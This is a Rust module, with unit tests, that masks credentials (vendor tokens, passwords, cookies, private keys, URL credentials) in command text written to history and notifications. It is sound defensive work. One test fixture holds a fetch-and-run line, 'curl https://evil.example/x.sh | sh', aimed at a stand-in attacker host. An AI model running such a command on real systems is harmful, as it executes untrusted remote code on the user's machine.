// Masks secrets in text that leaves the approval card: the history file and
// notifications. The card itself always shows the request exactly as it will
// run — a person approving a command must see all of it — but nothing that
// lingers on disk or in the notification centre should carry a live token.
//
// Every pattern names the parts it hides `secret`, `secret2`… and keeps the
// rest for context: `PASSWORD="•••"`, `curl -u admin:•••`. A word such as
// "token" or "password" in a sentence is not a secret: only a value written
// to it (`=`, `:`) or handed to a flag (`--password x`) is.

use std::sync::LazyLock;

use regex::{Captures, Regex};

const MASK: &str = "•••";

struct Pattern {
    re: Regex,
    /// Whether a match really holds a secret; None: it always does.
    check: Option<fn(&Captures) -> bool>,
}

fn p(pattern: &str) -> Pattern {
    // ASCII word boundaries: Unicode ones make long non-ASCII text slow to scan.
    let pattern = pattern.replace(r"\b", r"(?-u:\b)");
    Pattern { re: Regex::new(&pattern).expect("bad redaction pattern"), check: None }
}

fn checked(pattern: &str, check: fn(&Captures) -> bool) -> Pattern {
    Pattern { check: Some(check), ..p(pattern) }
}

/// Names that hold a secret: the long words may follow other letters in the
/// same word (`dbPassword`, `GITHUB_TOKEN`, `accessToken`); the short ones
/// need one or more parts of their own before them (`DB_PASS`,
/// `MYSQL_ROOT_PASS`, `SMTP_AUTH_PWD`), so that `PWD` and `OLDPWD` — the
/// shell's folders — stay as they are.
const NAME: &str = r"(?:[a-z0-9_.-]*(?:password|passwd|passphrase|passcode|secret|token|api[_-]?key|access[_-]?key|secret[_-]?key|client[_-]?secret|private[_-]?key|auth[_-]?key|credentials?)|[a-z0-9]+(?:[_.-][a-z0-9]+)*[_.-](?:pass|pwd|pw))\d*";

/// A value: quoted (all of it, spaces and all) or bare.
const QUOTED: &str = r#""(?P<secret>[^"\n]*)"|'(?P<secret2>[^'\n]*)'"#;

/// What starts a name: the start, a separator, a quote or a bracket — or the
/// `=` or `:` in front of it in `--from-literal=password=…`,
/// `--env=DB_PASSWORD=…`, PowerShell's `$env:API_TOKEN = …` and npm's
/// `//registry/:_authToken=…`.
const BEFORE: &str = r#"(?:^|[\s?&;,{(\["'`=:])"#;

/// A value that looks like a credential rather than a word: it has a digit or
/// a symbol, or is long.
fn looks_secret(value: &str) -> bool {
    value.chars().count() >= 12 || value.chars().any(|c| c.is_ascii_digit() || !c.is_alphanumeric())
}

fn value_of<'t>(c: &Captures<'t>) -> &'t str {
    ["secret", "secret2", "secret3"].iter().find_map(|n| c.name(n)).map_or("", |m| m.as_str())
}

/// A path handed to `--private-key` or `--token-file` is not the secret.
fn not_a_path(c: &Captures) -> bool {
    let v = value_of(c);
    !(v.starts_with('/') || v.starts_with("./") || v.starts_with("../") || v.starts_with("~/") || v.starts_with('@'))
}

/// A plain word of prose rather than a credential: letters only, lower case
/// after the first, and not too long — "automatically", "documentation".
fn a_plain_word(value: &str) -> bool {
    let mut chars = value.chars();
    chars.next().is_some_and(char::is_alphabetic)
        && chars.all(|c| c.is_alphabetic() && !c.is_uppercase())
        && value.chars().count() <= 20
}

static PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    vec![
        // PEM private keys, whole block.
        p(r"(?s)(?P<secret>-----BEGIN [A-Z ]*PRIVATE KEY-----.*?(?:-----END [A-Z ]*PRIVATE KEY-----|$))"),
        // Vendor tokens with a recognisable prefix.
        p(r"\b(?P<secret>(?:sk-ant-|sk-proj-|sk-)[A-Za-z0-9_-]{16,})"),
        p(r"\b(?P<secret>(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,})"),
        p(r"\b(?P<secret>glpat-[A-Za-z0-9_-]{16,})"),
        p(r"\b(?P<secret>xox[abposr]-[A-Za-z0-9-]{10,}|xapp-[A-Za-z0-9-]{10,})"),
        p(r"\b(?P<secret>(?:AKIA|ASIA)[0-9A-Z]{16})\b"),
        p(r"\b(?P<secret>AIza[0-9A-Za-z_-]{30,})"),
        p(r"\b(?P<secret>(?:sk|rk|pk)_(?:live|test)_[0-9A-Za-z]{16,})"),
        p(r"\b(?P<secret>npm_[A-Za-z0-9]{30,})"),
        p(r"\b(?P<secret>hf_[A-Za-z0-9]{30,})"),
        p(r"\b(?P<secret>dop_v1_[a-f0-9]{40,})"),
        p(r"\b(?P<secret>SG\.[A-Za-z0-9_-]{16,}\.[A-Za-z0-9_-]{16,})"),
        p(r"\b(?P<secret>shp(?:at|ca|pa|ss)_[a-fA-F0-9]{32})"),
        p(r"\b(?P<secret>pypi-[A-Za-z0-9_-]{50,})"),
        p(r"\b(?P<secret>dckr_pat_[A-Za-z0-9_-]{20,})"),
        p(r"\b(?P<secret>lin_api_[A-Za-z0-9]{30,})"),
        p(r"\b(?P<secret>PMAK-[A-Za-z0-9-]{20,})"),
        p(r"\b(?P<secret>sbp_[a-f0-9]{30,})"),
        // JSON Web Tokens.
        p(r"\b(?P<secret>eyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,})"),
        // Webhook addresses that are the credential themselves.
        p(r"(?i)\bhooks\.slack\.com/(?:services|workflows|triggers)/(?P<secret>[A-Za-z0-9/_-]+)"),
        p(r"(?i)\bdiscord(?:app)?\.com/api/webhooks/\d+/(?P<secret>[A-Za-z0-9_-]+)"),
        p(r"(?i)\bapi\.telegram\.org/(?:file/)?bot(?P<secret>\d+:[A-Za-z0-9_-]+)"),
        p(r"(?i)\.webhook\.office\.com/webhookb2/(?P<secret>[^\s'\x22]+)"),
        // Authorization headers: keep the scheme, hide the credential — and
        // never take the scheme's own name for the credential.
        p(
            r#"(?i)\b(?:authorization|proxy-authorization)\s*[:=]\s*["']?(?:bearer|basic|token|bot|digest)\s+(?P<secret>[^\s"',;]{6,})"#,
        ),
        checked(r#"(?i)\b(?:authorization|proxy-authorization)\s*[:=]\s*["']?(?P<secret>[^\s"',;]{6,})"#, |c| {
            !matches!(value_of(c).to_ascii_lowercase().as_str(), "bearer" | "basic" | "token" | "bot" | "digest")
        }),
        p(r"(?i)\bbearer\s+(?P<secret>[A-Za-z0-9._~+/=-]{12,})"),
        // Cookies are sessions: their name=value pairs, not the URL or the
        // command after the header, and not a sentence that says "cookie:".
        p(r#"(?i)\b(?:set-)?cookie\s*:\s*(?P<secret>[^\s=;"']+=[^\s;"']*(?:;\s*[^\s=;"']+=[^\s;"']*)*;?)"#),
        p(
            r#"(?i)(?:^|\s)(?:-b|--cookie)\s+(?:"(?P<secret>[^"\n]*=[^"\n]*)"|'(?P<secret2>[^'\n]*=[^'\n]*)'|(?P<secret3>[^\s'"]*=[^\s'"]*))"#,
        ),
        // Basic auth on a command line: `curl -u user:password`, `--user`, for
        // the HTTP and FTP clients whose `-u` takes a password (`docker run -u
        // 1000:1000` and `rsync -u host:path` are no secret); smbclient's
        // `-U user%password`.
        p(
            r#"(?i)(?:^|[\s|;&(/'"])(?:curl|wget|http|https|xh|lftp|ftp|aria2c)(?:\.exe)?\s(?:[^\n|;&]*?\s)?(?:-u|--user|--proxy-user|--http-user|--ftp-user)\s*=?\s*(?:'[^':\n]*:(?P<secret>[^'\n]+)'|"[^":\n]*:(?P<secret2>[^"\n]+)"|[^\s:'"]+:(?P<secret3>[^\s'"]+))"#,
        ),
        p(r#"\bsmbclient\b[^\n|;&]*?\s-U\s+[^\s%]+%(?P<secret>[^\s'"]+)"#),
        // Passwords handed to a short flag.
        p(
            r#"\b(?:mysql|mysqldump|mysqladmin|mysqlimport|mysqlshow|mysqlcheck|mysqlsh|mariadb|mariadb-dump)\b[^\n|;&]*?\s-p(?:'(?P<secret>[^'\n]*)'|"(?P<secret2>[^"\n]*)"|(?P<secret3>[^\s'"]+))"#,
        ),
        p(r#"\bsshpass\b[^\n|;&]*?\s-p\s*(?:'(?P<secret>[^'\n]*)'|"(?P<secret2>[^"\n]*)"|(?P<secret3>[^\s'"]+))"#),
        p(
            r#"\bredis-cli\b[^\n|;&]*?\s(?:-a|--pass)\s+(?:'(?P<secret>[^'\n]*)'|"(?P<secret2>[^"\n]*)"|(?P<secret3>[^\s'"]+))"#,
        ),
        p(
            r#"\b(?:docker|podman|buildah|skopeo|helm|oras|nerdctl|crane|regctl)\b[^\n|;&]*?\blogin\b[^\n|;&]*?\s-p\s+(?:'(?P<secret>[^'\n]*)'|"(?P<secret2>[^"\n]*)"|(?P<secret3>[^\s'"]+))"#,
        ),
        p(r#"\s-pass(?:in|out)?\s+pass:(?P<secret>[^\s'"]+)"#),
        p(r#"\bopenssl\b[^\n|;&]*?\s-k\s+(?:'(?P<secret>[^'\n]*)'|"(?P<secret2>[^"\n]*)"|(?P<secret3>[^\s'"]+))"#),
        // NAME="a quoted value", whole: `PASSWORD="correct horse battery staple"`.
        p(&format!(r#"(?i){BEFORE}-{{0,2}}["']?{NAME}["']?\s*[:=]\s*(?:{QUOTED})"#)),
        // NAME=value, bare: `DB_PASS=hunter2`, `?token=…&`.
        p(&format!(r#"(?i){BEFORE}-{{0,2}}["']?{NAME}["']?\s*=\s*(?P<secret3>[^\s"'&;,)}}]+)"#)),
        // NAME: value — a header or YAML. A plain word there must look like a
        // credential: "Password: change it" is a sentence.
        checked(&format!(r#"(?i){BEFORE}["']?(?P<name>{NAME})["']?\s*:\s*(?P<secret3>[^\s"',;)}}]+)"#), |c| {
            let name = c.name("name").map_or("", |m| m.as_str());
            name.contains(['_', '-', '.']) || looks_secret(value_of(c))
        }),
        // --flag value: `--password hunter2`, `--api-key abc`.
        checked(&format!(r#"(?i)(?:^|\s)--?{NAME}\s+(?:{QUOTED}|(?P<secret3>[^\s"'-][^\s"']*))"#), not_a_path),
        // identifier value: `aws configure set aws_secret_access_key wJalr…`.
        // A plain word after it is prose: "pass GITHUB_TOKEN automatically".
        checked(
            &format!(
                r#"(?i)(?:^|\s)(?:[a-z0-9]+[_.-][a-z0-9_.-]*{NAME})\s+(?:{QUOTED}|(?P<secret3>[^\s"'-][^\s"']*))"#
            ),
            |c| looks_secret(value_of(c)) && not_a_path(c) && !a_plain_word(value_of(c)),
        ),
        // Credentials in URLs: scheme://user:password@host, and Redis's
        // scheme://:password@host with no user.
        p(r"(?i)\b[a-z][a-z0-9+.-]*://[^\s/:@]*:(?P<secret>[^\s/@]{3,})@"),
    ]
});

/// A value that only names another: `$DB_PASS`, `${TOKEN}`, `%TOKEN%`,
/// `$env:TOKEN`, `$(cat secret)`. Masking it would hide nothing.
fn is_reference(value: &str) -> bool {
    let v = value.trim();
    v.is_empty()
        || v == MASK
        || v.starts_with('$')
        || v.starts_with('%') && v.ends_with('%') && v.len() > 2
        || v.starts_with("<") && v.ends_with('>')
}

/// What is left at the end of a text of a vendor token that was cut short:
/// its prefix and whatever of it there is. Whole, such tokens are masked by
/// `PATTERNS`; cut, they are too short for those to recognise.
static CUT_TOKEN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?-u:\b)(?:(?:AKIA|ASIA)[0-9A-Z]{4,}|AIza[0-9A-Za-z_-]{4,}|(?:sk-|ghp_|gho_|ghu_|ghs_|ghr_|github_pat_|glpat-|xox[abposr]-|xapp-|(?:sk|rk|pk)_(?:live|test)_|npm_|hf_|dop_v1_|SG\.|shp(?:at|ca|pa|ss)_|pypi-|dckr_pat_|lin_api_|PMAK-|sbp_|eyJ)[A-Za-z0-9._-]*)$",
    )
    .expect("bad cut-token pattern")
});

/// `redact`, for a text that may have been cut short — a notification body
/// built from the first characters of a command: a token cut off at the end
/// is masked as well, so not even its first half is shown.
pub fn redact_cut(text: &str) -> String {
    let out = redact(text);
    match CUT_TOKEN.find(&out) {
        Some(m) => format!("{}{MASK}", &out[..m.start()]),
        None => out,
    }
}

/// `text` with every recognised secret replaced by •••.
pub fn redact(text: &str) -> String {
    let mut out = text.to_string();
    for pat in PATTERNS.iter() {
        if !pat.re.is_match(&out) {
            continue;
        }
        out = pat
            .re
            .replace_all(&out, |c: &Captures| {
                let whole = c.get(0).expect("a match");
                if pat.check.is_some_and(|check| !check(c)) {
                    return whole.as_str().to_string();
                }
                let mut secrets: Vec<regex::Match> = pat
                    .re
                    .capture_names()
                    .flatten()
                    .filter(|n| n.starts_with("secret"))
                    .filter_map(|n| c.name(n))
                    .filter(|m| !is_reference(m.as_str()))
                    .collect();
                secrets.sort_by_key(|m| m.start());
                // Offsets are in the whole text; the match starts at `base`.
                let (text, base) = (whole.as_str(), whole.start());
                let mut s = String::new();
                let mut at = 0;
                for m in secrets {
                    s.push_str(&text[at..m.start() - base]);
                    s.push_str(MASK);
                    at = m.end() - base;
                }
                s.push_str(&text[at..]);
                s
            })
            .into_owned();
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn vendor_tokens() {
        let r = redact("export ANTHROPIC_API_KEY=sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123");
        assert!(!r.contains("abcdefghijklmnop"), "{r}");
        assert!(r.contains("ANTHROPIC_API_KEY="));
        assert_eq!(
            redact("git push https://ghp_0123456789abcdefghijABCDEFGHIJ@github.com/a/b"),
            "git push https://•••@github.com/a/b"
        );
        assert!(!redact("aws s3 ls --key AKIAIOSFODNN7EXAMPLE").contains("IOSFODNN7"));
    }

    #[test]
    fn headers_and_flags() {
        let r = redact(r#"curl -H "Authorization: Bearer abc.def.ghi-123456789" https://api.x.test"#);
        assert!(!r.contains("abc.def.ghi"), "{r}");
        assert!(r.contains("https://api.x.test"));
        let r = redact("mysql -u root --password hunter2hunter2 db");
        assert!(!r.contains("hunter2"), "{r}");
        let r = redact("login?user=ada&token=9f8e7d6c5b4a&next=/");
        assert!(!r.contains("9f8e7d6c5b4a"), "{r}");
        assert!(r.contains("next=/"));
    }

    #[test]
    fn url_credentials_and_keys() {
        assert_eq!(redact("postgres://app:s3cretpass@db:5432/x"), "postgres://app:•••@db:5432/x");
        let pem = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXk\n-----END OPENSSH PRIVATE KEY-----";
        assert_eq!(redact(pem), "•••");
    }

    #[test]
    fn ordinary_commands_are_untouched() {
        for c in ["npm test", "git push origin main", "cargo build --release", "echo $PATH", "ls -la ~/.ssh"] {
            assert_eq!(redact(c), c);
        }
    }

    /// The audit's list (adhoc-redact.txt): what each line must become.
    #[test]
    fn the_audits_list() {
        for (input, want) in [
            ("curl -u admin:S3cretP4ss https://api.x.test/v1", "curl -u admin:••• https://api.x.test/v1"),
            ("export DB_PASS=hunter2hunter2", "export DB_PASS=•••"),
            ("mysql -u root -phunter2hunter2 db", "mysql -u root -p••• db"),
            ("docker login -u me -p hunter2hunter2", "docker login -u me -p •••"),
            ("redis-cli -a hunter2hunter2 ping", "redis-cli -a ••• ping"),
            ("export DB_PASSWORD='Xy&9;kL,2)pQ-longer'", "export DB_PASSWORD='•••'"),
            ("export PASSWORD=\"correct horse battery staple\"", "export PASSWORD=\"•••\""),
            ("export OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrstuvwxyz0123456789", "export OPENAI_API_KEY=•••"),
            (
                "curl -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abcdefghijklmnop\" https://api.x.test",
                "curl -H \"Authorization: Bearer •••\" https://api.x.test",
            ),
            (
                "git clone https://user:ghp_abcdefghijklmnopqrstuvwxyz0123456789@github.com/a/b.git",
                "git clone https://user:•••@github.com/a/b.git",
            ),
            (
                "aws configure set aws_secret_access_key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                "aws configure set aws_secret_access_key •••",
            ),
            ("AKIAIOSFODNN7EXAMPLE", "•••"),
            (
                concat!("curl https://hooks.slack.com/services/", "T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"),
                "curl https://hooks.slack.com/services/•••",
            ),
            ("psql postgres://app:Sup3rS3cret@db.internal:5432/app", "psql postgres://app:•••@db.internal:5432/app"),
            // Prose stays prose.
            ("Renew the API token tomorrow", "Renew the API token tomorrow"),
            ("git commit -m \"fix token refresh logic\"", "git commit -m \"fix token refresh logic\""),
            ("grep -rn \"password reset\" src", "grep -rn \"password reset\" src"),
            ("pwd && whoami", "pwd && whoami"),
            ("pwd\nwhoami", "pwd\nwhoami"),
        ] {
            assert_eq!(redact(input), want, "{input}");
        }
    }

    #[test]
    fn more_shapes() {
        for (input, want) in [
            ("curl --user 'ada:p@ss word' https://x.test", "curl --user 'ada:•••' https://x.test"),
            ("smbclient //srv/share -U ada%hunter2", "smbclient //srv/share -U ada%•••"),
            ("sshpass -p 'hunter 2' ssh host", "sshpass -p '•••' ssh host"),
            ("mysqldump -uroot -p\"pa ss\" db", "mysqldump -uroot -p\"•••\" db"),
            ("openssl enc -aes256 -pass pass:hunter2 -in a", "openssl enc -aes256 -pass pass:••• -in a"),
            ("curl -H 'Cookie: session=abc123; theme=dark' https://x.test", "curl -H 'Cookie: •••' https://x.test"),
            ("curl -b 'sid=abc123' https://x.test", "curl -b '•••' https://x.test"),
            (
                "curl https://discord.com/api/webhooks/123456/AbC-dEf_123",
                "curl https://discord.com/api/webhooks/123456/•••",
            ),
            (
                "curl https://api.telegram.org/bot12345:AAH-x_y/sendMessage",
                "curl https://api.telegram.org/bot•••/sendMessage",
            ),
            ("{\"password\": \"two words\", \"user\": \"ada\"}", "{\"password\": \"•••\", \"user\": \"ada\"}"),
            ("password: hunter2", "password: •••"),
            ("X-Api-Key: abcdef", "X-Api-Key: •••"),
            ("const accessToken = \"abc123def\"", "const accessToken = \"•••\""),
            ("gh auth login --with-token --token abc123", "gh auth login --with-token --token •••"),
            ("export SMTP_PWD=letmein1", "export SMTP_PWD=•••"),
            // A reference to a secret is not one; a path to a key file is not the key.
            ("export DB_PASS=$DB_PASS_FROM_VAULT", "export DB_PASS=$DB_PASS_FROM_VAULT"),
            ("PASSWORD=\"${PASSWORD}\" make deploy", "PASSWORD=\"${PASSWORD}\" make deploy"),
            ("ssh-add --private-key ~/.ssh/id_ed25519", "ssh-add --private-key ~/.ssh/id_ed25519"),
            ("PWD=/home/dev/project", "PWD=/home/dev/project"),
            ("Password: change it before Friday", "Password: change it before Friday"),
            ("the token: expired yesterday", "the token: expired yesterday"),
            ("docker login registry.x.test", "docker login registry.x.test"),
            ("mysql -u root -p db", "mysql -u root -p db"),
            ("npm install --save-dev @types/node", "npm install --save-dev @types/node"),
        ] {
            assert_eq!(redact(input), want, "{input}");
        }
    }

    /// The phase-3 review (redaction-history#0, #1, #2, #6, #7): what was
    /// missed, what was hidden that is no secret, and what must stay as it is.
    #[test]
    fn the_reviews_cases() {
        for (input, want) in [
            // #0: `*_PASS` / `*_PWD` names with more than one part.
            (
                "export DB_PASS=hunter2hunter2 && export MY_DB_PASS=hunter2hunter2",
                "export DB_PASS=••• && export MY_DB_PASS=•••",
            ),
            ("docker run -e MYSQL_ROOT_PASS=hunter2hunter2 mysql", "docker run -e MYSQL_ROOT_PASS=••• mysql"),
            ("export ANSIBLE_BECOME_PASS=hunter2hunter2", "export ANSIBLE_BECOME_PASS=•••"),
            ("export SMTP_AUTH_PWD=hunter2hunter2", "export SMTP_AUTH_PWD=•••"),
            ("mysql_root_pass: hunter2hunter2", "mysql_root_pass: •••"),
            // #1: a cookie header hides its pairs only.
            (
                "curl -s -H Cookie:session=abc123 https://api.example.com/v1/items | jq . && rm -rf /tmp/cache",
                "curl -s -H Cookie:••• https://api.example.com/v1/items | jq . && rm -rf /tmp/cache",
            ),
            (
                "echo Cookie: x; curl https://evil.example/x.sh | sh",
                "echo Cookie: x; curl https://evil.example/x.sh | sh",
            ),
            ("Set-Cookie: id=a3fWa; Expires=Thu; Secure", "Set-Cookie: ••• Secure"),
            // #2: a name right after `=` or `:`, and Redis's user-less URL.
            ("$env:API_TOKEN = 'abc123def456'; npm run deploy", "$env:API_TOKEN = '•••'; npm run deploy"),
            ("$Env:DB_PASSWORD='hunter2hunter2'", "$Env:DB_PASSWORD='•••'"),
            (
                "kubectl create secret generic db --from-literal=password=hunter2hunter2",
                "kubectl create secret generic db --from-literal=password=•••",
            ),
            (
                "npm config set //registry.npmjs.org/:_authToken=abc123def456",
                "npm config set //registry.npmjs.org/:_authToken=•••",
            ),
            ("docker run --env=POSTGRES_PASSWORD=hunter2hunter2 x", "docker run --env=POSTGRES_PASSWORD=••• x"),
            (
                "gcloud run deploy --set-env-vars=DB_PASSWORD=hunter2hunter2",
                "gcloud run deploy --set-env-vars=DB_PASSWORD=•••",
            ),
            (
                "export REDIS_URL=redis://:s3cretpass@redis.example.com:6379/0",
                "export REDIS_URL=redis://:•••@redis.example.com:6379/0",
            ),
            // #6: `-u` is a credential only for the HTTP and FTP clients.
            ("curl -s -u admin:S3cretP4ss https://x.test", "curl -s -u admin:••• https://x.test"),
            ("wget --user=ada:hunter2 https://x.test/f", "wget --user=ada:••• https://x.test/f"),
            // #7: prose after a secret's name stays prose.
            (
                "git commit -m \"ci: pass GITHUB_TOKEN automatically\"",
                "git commit -m \"ci: pass GITHUB_TOKEN automatically\"",
            ),
            (
                "git commit -m \"docs: explain the access_token documentation\"",
                "git commit -m \"docs: explain the access_token documentation\"",
            ),
        ] {
            assert_eq!(redact(input), want, "{input}");
        }
        // Not secrets, before or after.
        for same in [
            "PWD=/home/dev/project",
            "OLDPWD=/tmp",
            "pwd && whoami",
            "git commit -m \"cookie: banner shows twice\"",
            "grep -i set-cookie: headers.txt | head -5",
            "grep -rn 'API_TOKEN=' .",
            "git log --grep=password",
            "git log --format=%an:%ae",
            "curl url=https://x.test/a:b",
            "curl http://[::1]:8080/x@y",
            "docker run -u 1000:1000 node:20 npm test",
            "docker exec -u root:root app ls",
            "rsync -u host:/path ./www/",
            "sort -u data:x",
            "echo https://x.test -u a:b",
            "export ALLOW_BYPASS=yes",
        ] {
            assert_eq!(redact(same), same);
        }
    }

    /// redaction-history#4: a notification built from the first characters of
    /// a command must not show the first half of a token it cut.
    #[test]
    fn a_token_cut_off_at_the_end_is_hidden_too() {
        let token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let command = format!("git push https://{token}@github.com/a/b main");
        let cut: String = command.chars().take(40).collect();
        assert!(cut.ends_with("ghp_ABCDEFGHIJKLMNOPQRS"), "{cut}");
        assert_eq!(redact(&cut), cut, "too short for the token pattern");
        assert_eq!(redact_cut(&cut), "git push https://•••");
        assert_eq!(redact_cut("Bash: export KEY=sk-ant-api03-A"), "Bash: export KEY=•••");
        assert_eq!(redact_cut("Bash: curl -H 'x: eyJhbGciOiJIUzI1NiJ9.eyJz"), "Bash: curl -H 'x: •••");
        // Whole tokens are masked as before; ordinary endings stay.
        assert_eq!(redact_cut(&command), "git push https://•••@github.com/a/b main");
        for same in ["npm run risk-check", "Bash: ls -la", "pip install task-runner", "echo ASIAN", "Bash: echo AKIA"] {
            assert_eq!(redact_cut(same), same);
        }
    }
}
